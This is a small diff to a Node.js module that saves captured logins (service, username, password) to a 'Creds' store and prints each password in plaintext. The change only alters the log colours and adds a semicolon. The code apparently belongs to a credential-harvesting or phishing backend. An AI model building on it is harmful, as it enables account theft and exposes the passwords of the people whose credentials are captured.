@@ -18,7 +18,7 @@ exports.saveNewLogin = function (serviceName, username, password) {
         });
         newLogin.save();
     }
-    console.info(`${chalk.green(`[!${chalk.red('|')}!]`)} New login from ${chalk.green(serviceName)} - Username: ${chalk.red(username)} Password: ${chalk.red(password)}`);
+    console.info(`${chalk.blue(`[!${chalk.red('==')}!]`)} New login from ${chalk.green(serviceName)} - Username: ${chalk.red(username)} Password: ${chalk.red(password)}`);
 };
 
 /**
@@ -28,4 +28,4 @@ exports.saveNewLogin = function (serviceName, username, password) {
 exports.fetchLogins = async function() {
     let logins = await driver.getModals().Creds.fetch({});
     return logins;
-}
+};
